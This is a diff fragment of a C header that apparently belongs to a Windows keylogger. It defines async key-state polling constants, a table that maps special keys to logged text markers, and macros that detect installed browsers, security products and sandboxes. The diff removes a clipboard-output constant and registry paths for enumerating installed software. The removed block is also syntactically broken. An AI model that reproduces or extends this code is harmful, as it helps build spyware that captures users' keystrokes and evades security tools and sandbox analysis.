@@ -23,9 +23,7 @@
 #define StartUnmapedKeys    0x00
 #define EndUnmapedKeys      0x0C
 #define MaxDirPathLength    0xFF
-#define MaxClipboardDataOut 0x30
 #define Vk_DEL              0x08
-//#define VK_TAB              0x09
 #define VK_CRLF             0x0D
 #define AsyncKeyStateTest_0 0x00
 #define AsyncKeyStateTest_1 0x01
@@ -47,19 +45,6 @@
 #define AsciiAlternitive_0  0x28
 #define DetectBrowserInstalation DetectBrowserInstalationExA
 #define DetectSecurityInstalation DetectSecurityInstalationExA
-
-#ifdef _WIN64
-        #define PrimaryInstalledSoftwareKeys "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
-        #define SecondaryInstalledSoftwareKeys "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
-#elifdef _WIN32
-        if (IsWow64Process(GetCurrentProcess(),false)
-            #define PrimaryInstalledSoftwareKeys "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
-            #define SecondaryInstalledSoftwareKeys "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
-#else
-        #define PrimaryInstalledSoftwareKeys "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
-        #define SecondaryInstalledSoftwareKeys NULL
-#endif
-//LPCSTR END_DIRECTORY= TEXT("%SYSTEMROOT%\\System32");
 
 
 
@@ -100,8 +85,8 @@ FORCEINLINE BOOL SandBoxDetectionExA()
 
 
 const extern FunctionKeys MapFunctionVkeys[]={
-    MapFunctionKeys(Vk_DEL,(char*)" \\<DEL>\\ "),MapFunctionKeys(VK_TAB,(char*)" \\<TAB>\\ "),MapFunctionKeys(VK_CRLF,(char*)" \\<CRLF>\\ "),\
-    MapFunctionKeys(VK_CONTROL,(char*)" \\<CTRL>\\ ")};
+    MapFunctionKeys(Vk_DEL,(char*)" \\*DEL*\\ "),MapFunctionKeys(VK_TAB,(char*)" \\*TAB*\\ "),MapFunctionKeys(VK_CRLF,(char*)" \\*CRLF*\\ "),\
+    MapFunctionKeys(VK_CONTROL,(char*)" \\*CTRL*\\ ")};
 
 const extern char _Char_Table[CharTableSize]={
     AsciiAlternitive_1,AsciiAlternitive_2,AsciiAlternitive_3,AsciiAlternitive_4,AsciiAlternitive_5,
